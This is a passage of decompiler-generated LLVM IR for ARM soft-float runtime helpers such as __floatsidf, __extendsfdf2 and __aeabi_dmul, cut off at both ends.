  call void @__pseudo_cond_branch(i1 %v2_215e4, i32 %v0_215ec)
  store i32 1074, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* @r1, align 4
  %v0_21604 = call i32 @function_21424()
  ret i32 %v0_21604

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__floatsidf(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_21608 = icmp eq i32 %arg1, 0
  br i1 %v2_21608, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v0_21610 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_21608, i32 %v0_21610)
  store i32 1074, i32* @r4, align 4
  %v1_21620 = and i32 %arg1, -2147483648
  store i32 %v1_21620, i32* @r5, align 4
  %v2_21620 = icmp eq i32 %v1_21620, 0
  br i1 %v2_21620, label %bb5, label %bb4

bb4:                                              ; preds = %bb3
  %v2_21624 = sub i32 0, %arg1
  store i32 %v2_21624, i32* @r0, align 4
  br label %bb5

bb5:                                              ; preds = %bb3, %bb4
  store i32 0, i32* @r1, align 4
  %v0_2162c = call i32 @function_21424()
  ret i32 %v0_2162c

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1, 3 }
  uselistorder label %bb5, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__extendsfdf2(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %v2_21630 = mul i32 %arg1, 2
  store i32 %v2_21630, i32* %r2.global-to-local, align 4
  %v4_21630 = icmp eq i32 %v2_21630, 0
  %v1_21634 = and i32 %v2_21630, 4
  %v2_21634 = icmp ne i32 %v1_21634, 0
  %v3_21634 = sdiv i32 %v2_21630, 8
  %v3_21638 = zext i1 %v2_21634 to i32
  %v6_21638 = zext i32 %v3_21634 to i64
  %v7_21638 = sub nsw i32 33, %v3_21634
  %v8_21638 = zext i32 %v7_21638 to i64
  %v9_21638 = shl i64 %v6_21638, %v8_21638
  %v10_21638 = sub nsw i32 32, %v3_21634
  %v11_21638 = shl i32 %v3_21638, %v10_21638
  %v12_21638 = zext i32 %v11_21638 to i64
  %v14_21638 = or i64 %v12_21638, %v9_21638
  %v15_21638 = trunc i64 %v14_21638 to i32
  store i32 %v15_21638, i32* %r1.global-to-local, align 4
  %v3_2163c = mul i32 %arg1, 536870912
  store i32 %v3_2163c, i32* @r0, align 4
  br i1 %v4_21630, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v2_21640 = and i32 %v2_21630, -16777216
  store i32 %v2_21640, i32* @r3, align 4
  %v4_21640 = icmp eq i32 %v2_21640, 0
  br i1 %v4_21640, label %.thread1, label %bb7

bb7:                                              ; preds = %bb
  %v4_21644 = icmp ugt i32 %v2_21630, -16777217
  br i1 %v4_21644, label %.thread1, label %bb8

bb8:                                              ; preds = %bb7
  %v2_21648 = xor i32 %v15_21638, 939524096
  store i32 %v2_21648, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb, %bb7, %bb8
  %v1_2164c = phi i1 [ false, %bb ], [ false, %bb7 ], [ true, %bb8 ], [ false, %entry ]
  %v0_2164c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_2164c, i32 %v0_2164c)
  %v0_21650 = load i32, i32* %r2.global-to-local, align 4
  %v2_21650 = icmp eq i32 %v0_21650, 0
  br i1 %v2_21650, label %bb10, label %bb9

bb9:                                              ; preds = %.thread1
  %v1_21654 = load i32, i32* @r3, align 4
  %v4_21654 = icmp eq i32 %v1_21654, -16777216
  br label %bb10

bb10:                                             ; preds = %.thread1, %bb9
  %v1_21658 = phi i1 [ true, %.thread1 ], [ %v4_21654, %bb9 ]
  %v0_21658 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_21658, i32 %v0_21658)
  store i32 896, i32* @r4, align 4
  %v0_21664 = load i32, i32* %r1.global-to-local, align 4
  %v1_21664 = and i32 %v0_21664, -2147483648
  store i32 %v1_21664, i32* @r5, align 4
  %tmp = bitcast i32 %v0_21664 to float
  %tmp11 = call float @fabsf(float %tmp)
  %v1_21668 = bitcast float %tmp11 to i32
  store i32 %v1_21668, i32* @r1, align 4
  %v0_2166c = call i32 @function_21424()
  ret i32 %v0_2166c

; uselistorder directives
  uselistorder i32 %v3_21634, { 1, 2, 0 }
  uselistorder i32 %v2_21630, { 0, 4, 5, 3, 2, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder i32 ()* @function_21424, { 1, 0, 2 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %.thread1, { 3, 2, 1, 0 }
}

define i32 @__aeabi_ul2d(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_21670 = or i32 %arg2, %arg1
  %v4_21670 = icmp eq i32 %v2_21670, 0
  %v0_21674 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_21670, i32 %v0_21674)
  store i32 0, i32* @r5, align 4
  %v0_21680 = call i32 @function_216a0()
  ret i32 %v0_21680
}

define i32 @__floatdidf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_21684 = or i32 %arg2, %arg1
  %v4_21684 = icmp eq i32 %v2_21684, 0
  %v0_21688 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_21684, i32 %v0_21688)
  %v1_21694 = icmp sgt i32 %arg2, -1
  call void @__pseudo_cond_branch(i1 %v1_21694, i32 ptrtoint (i32* @global_var_216a0.1899 to i32))
  %v1_21698 = sub i32 0, %arg1
  ret i32 %v1_21698

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_216a0() local_unnamed_addr {
dec_label_pc_216a0:
  %r4.global-to-local = alloca i32, align 4
  store i32 1074, i32* %r4.global-to-local, align 4
  %v0_216a8 = load i32, i32* @r1, align 4
  %tmp = icmp ult i32 %v0_216a8, 4194304
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_213c4.1897 to i32))
  %tmp6 = icmp ult i32 %v0_216a8, 33554432
  br i1 %tmp6, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_216a0
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_216a0, %bb
  %v1_216c0 = phi i32 [ 3, %dec_label_pc_216a0 ], [ 6, %bb ]
  %tmp7 = icmp ult i32 %v0_216a8, 268435456
  br i1 %tmp7, label %bb5, label %bb4

bb4:                                              ; preds = %bb3
  %v2_216c0 = add nuw nsw i32 %v1_216c0, 3
  br label %bb5

bb5:                                              ; preds = %bb3, %bb4
  %v0_216c4 = phi i32 [ %v1_216c0, %bb3 ], [ %v2_216c0, %bb4 ]
  %not. = icmp slt i32 %v0_216a8, 0
  %v4_216c4 = zext i1 %not. to i32
  %v5_216c4 = add nsw i32 %v0_216c4, %v4_216c4
  %v1_216c8 = sub nsw i32 32, %v5_216c4
  %v0_216cc = load i32, i32* @r0, align 4
  %v6_216cc = shl i32 %v0_216cc, %v1_216c8
  store i32 %v6_216cc, i32* @ip, align 4
  %v6_216d0 = lshr i32 %v0_216cc, %v5_216c4
  %v1_216d4 = load i32, i32* @r1, align 4
  %v7_216d4 = shl i32 %v1_216d4, %v1_216c8
  %v8_216d4 = or i32 %v7_216d4, %v6_216d0
  %v6_216d8 = lshr i32 %v1_216d4, %v5_216c4
  %v0_216dc = load i32, i32* %r4.global-to-local, align 4
  %v2_216dc = add i32 %v0_216dc, %v5_216c4
  store i32 %v2_216dc, i32* @r4, align 4
  %v4_216e0 = sext i32 %v8_216d4 to i64
  %v5_216e0 = call i32 @function_213c4(i64 %v4_216e0, i32 %v6_216d8, i32 %v5_216c4, i32 %v1_216c8)
  ret i32 %v5_216e0

; uselistorder directives
  uselistorder i32 %v5_216c4, { 2, 0, 1, 3, 4 }
  uselistorder label %bb5, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dmul(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = sext i32 %arg3 to i64
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp32 = trunc i64 %arg1 to i32
  store i32 %tmp32, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_216e4 = load i32, i32* @r4, align 4
  store i32 %v3_216e4, i32* %stack_var_-16, align 4
  %v12_216e4 = load i32, i32* @lr, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v4_216f0 = udiv i32 %arg2, 1048576
  %v5_216f0 = urem i32 %v4_216f0, 2048
  store i32 %v5_216f0, i32* %r4.global-to-local, align 4
  %v6_216f0 = icmp eq i32 %v5_216f0, 0
  br i1 %v6_216f0, label %.thread2, label %bb

bb:                                               ; preds = %entry
  %v5_216f4 = udiv i32 %arg4, 1048576
  %v6_216f4 = urem i32 %v5_216f4, 2048
  store i32 %v6_216f4, i32* @r5, align 4
  %v7_216f4 = icmp eq i32 %v6_216f4, 0
  br i1 %v7_216f4, label %.thread2, label %bb38

bb38:                                             ; preds = %bb
  %v5_216f8 = icmp eq i32 %v5_216f0, 2047
  br i1 %v5_216f8, label %.thread2, label %bb39

bb39:                                             ; preds = %bb38
  %v5_216fc = icmp eq i32 %v6_216f4, 2047
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb, %bb38, %bb39
  %v0_21700 = phi i1 [ true, %bb ], [ true, %bb38 ], [ %v5_216fc, %bb39 ], [ true, %entry ]
  store i32 ptrtoint (i32* @global_var_21704.1902 to i32), i32* %lr.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %v0_21700, i32 ptrtoint (i32* @global_var_218dc.1900 to i32))
  %v0_21704 = load i32, i32* %r4.global-to-local, align 4
  %v1_21704 = load i32, i32* @r5, align 4
  %v2_21704 = add i32 %v1_21704, %v0_21704
  store i32 %v2_21704, i32* %r4.global-to-local, align 4
  %v2_21708 = xor i32 %arg4, %arg2
  %v1_2170c = load i32, i32* %ip.global-to-local, align 4
  %tmp51 = mul i32 %v1_2170c, -2097152
  %v5_2170c = add i32 %tmp51, -1
  %v6_2170c = and i32 %v5_2170c, %arg2
  store i32 %v6_2170c, i32* %r1.global-to-local, align 4
  %v6_21710 = and i32 %v5_2170c, %arg4
  %v5_21714 = mul i32 %arg2, 4096
  %v6_21714 = or i32 %v5_21714, %tmp32
  %v8_21714 = icmp eq i32 %v6_21714, 0
  br i1 %v8_21714, label %.thread3, label %bb40

.thread3:                                         ; preds = %.thread2
  %v1_2171c5 = or i32 %v6_2170c, 1048576
  store i32 %v1_2171c5, i32* %r1.global-to-local, align 4
  %v1_217207 = or i32 %v6_21710, 1048576
  br label %dec_label_pc_217a0

bb40:                                             ; preds = %.thread2
  %v6_21718 = mul i32 %arg4, 4096
  %v7_21718 = or i32 %v6_21718, %arg3
  %v9_21718 = icmp eq i32 %v7_21718, 0
  %v1_2171c = or i32 %v6_2170c, 1048576
  store i32 %v1_2171c, i32* %r1.global-to-local, align 4
  %v1_21720 = or i32 %v6_21710, 1048576
  br i1 %v9_21718, label %dec_label_pc_217a0, label %dec_label_pc_21728

dec_label_pc_21728:                               ; preds = %bb40
  %v6_21728 = mul nuw i64 %tmp, %arg1
  %v7_21728 = udiv i64 %v6_21728, 4294967296
  %v9_21728 = trunc i64 %v6_21728 to i32
  store i32 %v9_21728, i32* %ip.global-to-local, align 4
  %v7_21730 = zext i32 %v1_2171c to i64
  %v11_21730 = mul nuw nsw i64 %v7_21730, %tmp
  %v12_21730 = add i64 %v11_21730, %v7_21728
  %v1_21734 = and i32 %v2_21708, -2147483648
  %v10_21738 = zext i32 %v1_21720 to i64
  %v11_21738 = mul nuw i64 %v10_21738, %arg1
  %v12_21738 = add i64 %v12_21730, %v11_21738
  %v13_21738 = udiv i64 %v12_21738, 4294967296
  %v15_21738 = trunc i64 %v12_21738 to i32
  %v10_21740 = mul nuw i64 %v10_21738, %v7_21730
  %v11_21740 = add i64 %v13_21738, %v10_21740
  %v12_21740 = udiv i64 %v11_21740, 4294967296
  %v13_21740 = trunc i64 %v12_21740 to i32
  %v14_21740 = trunc i64 %v11_21740 to i32
  %v2_21744 = icmp eq i32 %v9_21728, 0
  br i1 %v2_21744, label %bb42, label %bb41

bb41:                                             ; preds = %dec_label_pc_21728
  %v2_21748 = or i32 %v15_21738, 1
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_21728, %bb41
  %storemerge = phi i32 [ %v2_21748, %bb41 ], [ %v15_21738, %dec_label_pc_21728 ]
  %v0_2175c = phi i32 [ %v2_21748, %bb41 ], [ %v15_21738, %dec_label_pc_21728 ]
  store i32 %storemerge, i32* %lr.global-to-local, align 4
  %v1_2174c = add i32 %v2_21704, -255
  %v2_21750 = icmp ugt i32 %v13_21740, 511
  %v2_21754 = icmp eq i1 %v2_21750, false
  %v3_21754 = add i32 %v2_21704, -1023
  %v5_21754 = sext i1 %v2_21754 to i32
  %v6_21754 = add i32 %v3_21754, %v5_21754
  store i32 %v6_21754, i32* %r4.global-to-local, align 4
  %v3_21758 = icmp ugt i32 %v1_2174c, 768
  br i1 %v3_21758, label %dec_label_pc_21768, label %dec_label_pc_2175c

dec_label_pc_2175c:                               ; preds = %bb42
  %v1_2175c = icmp slt i32 %v0_2175c, 0
  %v2_2175c = mul i32 %v0_2175c, 2
  store i32 %v2_2175c, i32* %lr.global-to-local, align 4
  %v3_21760 = mul i32 %v14_21740, 2
  %v4_21760 = zext i1 %v1_2175c to i32
  %v5_21760 = or i32 %v4_21760, %v3_21760
  %v9_21760 = icmp ule i32 %v5_21760, %v14_21740
  %v10_21760 = icmp ult i32 %v3_21760, %v14_21740
  %v11_21760 = select i1 %v1_2175c, i1 %v9_21760, i1 %v10_21760
  %v3_2176425 = mul nuw nsw i64 %v12_21740, 2
  %v3_21764 = trunc i64 %v3_2176425 to i32
  %v4_21764 = zext i1 %v11_21760 to i32
  %v5_21764 = or i32 %v4_21764, %v3_21764
  br label %dec_label_pc_21768

dec_label_pc_21768:                               ; preds = %bb42, %dec_label_pc_2175c
  %v0_21778 = phi i32 [ %v0_2175c, %bb42 ], [ %v2_2175c, %dec_label_pc_2175c ]
  %v0_21770 = phi i32 [ %v14_21740, %bb42 ], [ %v5_21760, %dec_label_pc_2175c ]
  %v1_21768 = phi i32 [ %v13_21740, %bb42 ], [ %v5_21764, %dec_label_pc_2175c ]
  %v4_21768 = mul i32 %v1_21768, 2048
  %v4_2176c = udiv i32 %v0_21770, 2097152
  %v5_21768 = or i32 %v4_2176c, %v1_21734
  %v5_2176c = or i32 %v5_21768, %v4_21768
  store i32 %v5_2176c, i32* %r1.global-to-local, align 4
  %v3_21770 = mul i32 %v0_21770, 2048
  %v4_21774 = udiv i32 %v0_21778, 2097152
  %v5_21774 = or i32 %v3_21770, %v4_21774
  store i32 %v5_21774, i32* %r0.global-to-local, align 4
  %v3_21778 = mul i32 %v0_21778, 2048
  store i32 %v3_21778, i32* %lr.global-to-local, align 4
  %v1_2177c = add i32 %v6_21754, -253
  store i32 %v1_2177c, i32* %ip.global-to-local, align 4
  %v2_2177c = icmp ugt i32 %v6_21754, 252
  %v7_2177c = icmp eq i32 %v6_21754, 253
  %v2_21780 = xor i1 %v7_2177c, true
  %v3_21780 = and i1 %v2_2177c, %v2_21780
  br i1 %v3_21780, label %bb43, label %bb44

bb43:                                             ; preds = %dec_label_pc_21768
  %v6_21780 = icmp ugt i32 %v1_2177c, 1791
  %v11_21780 = icmp eq i32 %v1_2177c, 1792
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_21768, %bb43
  %v1_21784 = phi i1 [ %v7_2177c, %dec_label_pc_21768 ], [ %v11_21780, %bb43 ]
  %v0_21784 = phi i1 [ %v2_2177c, %dec_label_pc_21768 ], [ %v6_21780, %bb43 ]
  %v2_21784 = xor i1 %v1_21784, true
  %v3_21784 = and i1 %v0_21784, %v2_21784
  call void @__pseudo_cond_branch(i1 %v3_21784, i32 ptrtoint (i32* @global_var_217d0.1901 to i32))
  %v0_21788 = load i32, i32* %lr.global-to-local, align 4
  %v2_21788 = icmp slt i32 %v0_21788, 0
  %v6_21788 = icmp eq i32 %v0_21788, -2147483648
  %v1_2178c = load i32, i32* %r0.global-to-local, align 4
  br i1 %v6_21788, label %bb45, label %._crit_edge

bb45:                                             ; preds = %bb44
  %v2_2178c = urem i32 %v1_2178c, 2
  %v3_2178c = icmp ne i32 %v2_2178c, 0
  %v4_2178c = udiv i32 %v1_2178c, 2
  store i32 %v4_2178c, i32* %lr.global-to-local, align 4
  br label %._crit_edge

._crit_edge:                                      ; preds = %bb44, %bb45
  %v1_21790 = phi i1 [ %v3_2178c, %bb45 ], [ %v2_21788, %bb44 ]
  %v2_21790 = zext i1 %v1_21790 to i32
  %v3_21790 = add i32 %v2_21790, %v1_2178c
  store i32 %v3_21790, i32* %r0.global-to-local, align 4
  %v0_21794 = load i32, i32* %r1.global-to-local, align 4
  %v1_21794 = load i32, i32* %r4.global-to-local, align 4
  %v2_21794 = and i32 %v1_21794, 4096
  %v3_21794 = icmp ne i32 %v2_21794, 0
  %v4_21794 = mul i32 %v1_21794, 1048576
  %v6_21794 = add i32 %v4_21794, %v0_21794
  %v7_21794 = zext i1 %v3_21794 to i32
  %v8_21794 = add i32 %v7_21794, %v6_21794
  store i32 %v8_21794, i32* %r1.global-to-local, align 4
  %v2_21798 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_21798, i32* %r4.global-to-local, align 4
  store i32 %v12_216e4, i32* %lr.global-to-local, align 4
  ret i32 %v3_21790

dec_label_pc_217a0:                               ; preds = %.thread3, %bb40
  %v1_217ac = phi i32 [ %v1_217207, %.thread3 ], [ %v1_21720, %bb40 ]
  %v1_217a4 = phi i32 [ %v1_2171c5, %.thread3 ], [ %v1_2171c, %bb40 ]
  %v1_217a0 = and i32 %v2_21708, -2147483648
  %v2_217a4 = or i32 %v1_217a4, %v1_217a0
  %v4_217a81 = or i64 %tmp, %arg1
  %v4_217a8 = trunc i64 %v4_217a81 to i32
  store i32 %v4_217a8, i32* %r0.global-to-local, align 4
  %v2_217ac = xor i32 %v2_217a4, %v1_217ac
  store i32 %v2_217ac, i32* %r1.global-to-local, align 4
  %v4_217b0 = udiv i32 %v1_2170c, 2
  %v5_217b0 = sub i32 %v2_21704, %v4_217b0
  store i32 %v5_217b0, i32* %r4.global-to-local, align 4
  %v7_217b0 = sub i32 0, %v5_217b0
  %v8_217b0 = and i32 %v2_21704, %v7_217b0
  %v11_217b0 = icmp eq i32 %v2_21704, %v4_217b0
  %v7_217b4 = icmp sgt i32 %v2_21704, %v4_217b0
  br i1 %v7_217b4, label %bb46, label %bb47

bb46:                                             ; preds = %dec_label_pc_217a0
  %v10_217b4 = sub i32 %v1_2170c, %v5_217b0
  %v12_217b4 = xor i32 %v5_217b0, %v1_2170c
  %v13_217b4 = xor i32 %v10_217b4, %v1_2170c
  %v14_217b4 = and i32 %v13_217b4, %v12_217b4
  %v17_217b4 = icmp eq i32 %v1_2170c, %v5_217b0
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_217a0, %bb46
  %v3_217c0.in = phi i32 [ %v8_217b0, %dec_label_pc_217a0 ], [ %v14_217b4, %bb46 ]
  %v2_217c0.in = phi i32 [ %v5_217b0, %dec_label_pc_217a0 ], [ %v10_217b4, %bb46 ]
  %v1_217c0 = phi i1 [ %v11_217b0, %dec_label_pc_217a0 ], [ %v17_217b4, %bb46 ]
  %v2_217c0 = icmp slt i32 %v2_217c0.in, 0
  %v3_217c0 = icmp slt i32 %v3_217c0.in, 0
  %v3_217b8 = xor i1 %v3_217c0, %v2_217c0
  %v4_217b8 = or i1 %v1_217c0, %v3_217b8
  br i1 %v4_217b8, label %._crit_edge23, label %bb48

._crit_edge23:                                    ; preds = %bb47
  %v0_217c0.pre = load i32, i32* %lr.global-to-local, align 4
  br label %bb49

bb48:                                             ; preds = %bb47
  %v9_217b830 = mul i32 %v5_217b0, 1048576
  %v10_217b831 = or i32 %v2_217ac, %v9_217b830
  store i32 %v10_217b831, i32* %r1.global-to-local, align 4
  %v7_217bc = load i32, i32* %stack_var_-16, align 4
  store i32 %v7_217bc, i32* %r4.global-to-local, align 4
  store i32 %v12_216e4, i32* %lr.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %._crit_edge23, %bb48
  %v0_217c0 = phi i32 [ %v0_217c0.pre, %._crit_edge23 ], [ %v12_216e4, %bb48 ]
  %v6_217c0 = xor i1 %v4_217b8, true
  call void @__pseudo_cond_branch(i1 %v6_217c0, i32 %v0_217c0)
  %v0_217c4 = load i32, i32* %r1.global-to-local, align 4
  %v1_217c4 = or i32 %v0_217c4, 1048576
  store i32 %v1_217c4, i32* %r1.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v0_217cc = load i32, i32* %r4.global-to-local, align 4
  %v1_217cc = add i32 %v0_217cc, -1
  store i32 %v1_217cc, i32* %r4.global-to-local, align 4
  ret i32 %v4_217a8

; uselistorder directives
  uselistorder i32 %v5_217b0, { 1, 0, 5, 3, 4, 2, 6 }
  uselistorder i32 %v4_217b0, { 2, 1, 0 }
  uselistorder i32 %v1_2178c, { 2, 0, 1 }
  uselistorder i32 %v0_21788, { 1, 0 }
  uselistorder i1 %v7_2177c, { 1, 0 }
  uselistorder i32 %v2_2175c, { 1, 0 }
  uselistorder i1 %v1_2175c, { 1, 0 }
  uselistorder i32 %v6_21754, { 0, 2, 1, 3 }
  uselistorder i32 %v0_2175c, { 1, 0, 2 }
  uselistorder i32 %v14_21740, { 1, 3, 2, 0 }
  uselistorder i64 %v11_21740, { 1, 0 }
  uselistorder i64 %v12_21738, { 1, 0 }
  uselistorder i64 %v10_21738, { 1, 0 }
  uselistorder i64 %v7_21730, { 1, 0 }
  uselistorder i64 %v6_21728, { 1, 0 }
  uselistorder i32 %v6_21710, { 1, 0 }
  uselistorder i32 %v6_2170c, { 1, 0, 2 }
  uselistorder i32 %v1_2170c, { 5, 2, 3, 4, 1, 0 }
  uselistorder i32 %v2_21704, { 4, 3, 0, 2, 1, 5, 6 }
  uselistorder i32 %v6_216f4, { 2, 1, 0 }
  uselistorder i32 %v5_216f0, { 2, 1, 0 }
  uselistorder i32 %v12_216e4, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 1, 5, 6, 7, 8, 9, 2, 10, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i32 -255, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %arg4, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 2, 3, 1, 4 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_217a0, { 1, 0 }
  uselistorder label %._crit_edge, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_21768, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %.thread2, { 3, 2, 1, 0 }
}

define i32 @function_217d0() local_unnamed_addr {
dec_label_pc_217d0:
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_16 = alloca i32, align 4
  %v0_217d0 = load i1, i1* @cpsr_z, align 1
  %v1_217d0 = load i1, i1* @cpsr_n, align 1
  %v2_217d0 = load i1, i1* @cpsr_v, align 1
  %v3_217d0 = xor i1 %v1_217d0, %v2_217d0
  %v4_217d0 = or i1 %v0_217d0, %v3_217d0
  br i1 %v4_217d0, label %dec_label_pc_217d4, label %dec_label_pc_2194c

dec_label_pc_217d4:                               ; preds = %dec_label_pc_217d0
  %v0_217d4 = load i32, i32* @r4, align 4
  %v4_217d4 = add i32 %v0_217d4, 54
  %v6_217d4 = sub i32 0, %v0_217d4
  %v7_217d4 = and i32 %v4_217d4, %v6_217d4
  %v8_217d4 = icmp slt i32 %v7_217d4, 0
  %v9_217d4 = icmp slt i32 %v4_217d4, 0
  %v10_217d4 = icmp eq i32 %v4_217d4, 0
  %v7_217d8 = icmp sgt i32 %v0_217d4, -54
  br i1 %v7_217d8, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_217d4
  store i32 0, i32* @r0, align 4
  %v8_217dc = load i32, i32* @r1, align 4
  %v9_217dc = and i32 %v8_217dc, -2147483648
  store i32 %v9_217dc, i32* @r1, align 4
  store i32 %tmp10, i32* @r4, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_217d4, %bb
  %v4_217e4 = xor i1 %v9_217d4, %v8_217d4
  %v5_217e4 = or i1 %v10_217d4, %v4_217e4
  call void @__pseudo_cond_branch(i1 %v5_217e4, i32 %tmp7)
  %v0_217e8 = load i32, i32* @r4, align 4
  %v1_217e8 = sub i32 0, %v0_217e8
  %v2_217ec = sub i32 -32, %v0_217e8
  %v4_217ec = add i32 %v0_217e8, 31
  %v5_217ec = and i32 %v4_217ec, %v1_217e8
  %v6_217ec = icmp slt i32 %v5_217ec, 0
  store i1 %v6_217ec, i1* @cpsr_v, align 1
  %v6_217f0 = icmp slt i32 %v1_217e8, 32
  br i1 %v6_217f0, label %dec_label_pc_217f4, label %dec_label_pc_21860

dec_label_pc_217f4:                               ; preds = %.thread1
  %v1_217f4 = add i32 %v2_217ec, 12
  %v8_217f8 = icmp sgt i32 %v1_217f4, 0
  br i1 %v8_217f8, label %dec_label_pc_21830, label %dec_label_pc_217fc

dec_label_pc_217fc:                               ; preds = %dec_label_pc_217f4
  %v1_217fc = add i32 %v2_217ec, 32
  %v1_21800 = sub i32 0, %v2_217ec
  %v0_21804 = load i32, i32* @r0, align 4
  %v6_21804 = shl i32 %v0_21804, %v1_21800
  %v2_21808 = add i32 %v2_217ec, 31
  %v3_21808 = shl i32 1, %v2_21808
  %v6_21808 = lshr i32 %v0_21804, %v1_217fc
  %v1_2180c = load i32, i32* @r1, align 4
  %v7_2180c = shl i32 %v1_2180c, %v1_21800
  %v8_2180c = or i32 %v7_2180c, %v6_21808
  %v1_21810 = and i32 %v1_2180c, -2147483648
  %tmp = bitcast i32 %v1_2180c to float
  %tmp19 = call float @fabsf(float %tmp)
  %v1_21814 = bitcast float %tmp19 to i32
  %tmp20 = icmp slt i32 %v6_21804, 0
  %v4_21818 = zext i1 %tmp20 to i32
  %v5_21818 = add i32 %v8_2180c, %v4_21818
  %v5_2181c = and i32 %v1_21814, %v3_21808
  %v6_2181c = icmp ne i32 %v5_2181c, 0
  %v7_2181c = lshr i32 %v1_21814, %v1_217fc
  %v9_2181c = add i32 %v7_2181c, %v1_21810
  %v10_2181c = zext i1 %v6_2181c to i32
  %v11_2181c = add i32 %v9_2181c, %v10_2181c
  store i32 %v11_2181c, i32* @r1, align 4
  %v19_2181c = add i32 %v11_2181c, %v10_2181c
  %v20_2181c = xor i32 %v19_2181c, %v1_2180c
  %v21_2181c = xor i32 %v19_2181c, %v7_2181c
  %v22_2181c = and i32 %v20_2181c, %v21_2181c
  %v23_2181c = icmp slt i32 %v22_2181c, 0
  store i1 %v23_2181c, i1* @cpsr_v, align 1
  %v3_21820 = mul i32 %v6_21804, 2
  %v4_21820 = or i32 %v3_21820, %tmp7
  %v5_21820 = icmp slt i32 %v4_21820, 0
  store i1 %v5_21820, i1* @cpsr_n, align 1
  %v6_21820 = icmp eq i32 %v4_21820, 0
  store i1 %v6_21820, i1* @cpsr_z, align 1
  br i1 %v6_21820, label %bb13, label %bb14

bb13:                                             ; preds = %dec_label_pc_217fc
  %tmp21 = sext i1 %tmp20 to i32
  %v6_21824 = add nsw i32 %tmp21, -1
  %v7_21824 = and i32 %v5_21818, %v6_21824
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_217fc, %bb13
  %v1_2182c = phi i32 [ %v5_21818, %dec_label_pc_217fc ], [ %v7_21824, %bb13 ]
  %v2_21828 = load i32, i32* %stack_var_16, align 4
  store i32 %v2_21828, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_2182c

dec_label_pc_21830:                               ; preds = %dec_label_pc_217f4
  %v1_21830 = sub i32 0, %v2_217ec
  %v1_21834 = add i32 %v2_217ec, 32
  %v0_21838 = load i32, i32* @r0, align 4
  %v6_21838 = shl i32 %v0_21838, %v1_21830
  %v6_2183c = lshr i32 %v0_21838, %v1_21834
  %v1_21840 = load i32, i32* @r1, align 4
  %v7_21840 = shl i32 %v1_21840, %v1_21830
  %v8_21840 = or i32 %v7_21840, %v6_2183c
  %v1_21844 = and i32 %v1_21840, -2147483648
  %tmp22 = icmp slt i32 %v6_21838, 0
  %v4_21848 = zext i1 %tmp22 to i32
  %v5_21848 = add i32 %v8_21840, %v4_21848
  %v6_21848 = icmp ult i32 %v5_21848, %v8_21840
  %v2_2184c = zext i1 %v6_21848 to i32
  %v3_2184c = or i32 %v2_2184c, %v1_21844
  store i32 %v3_2184c, i32* @r1, align 4
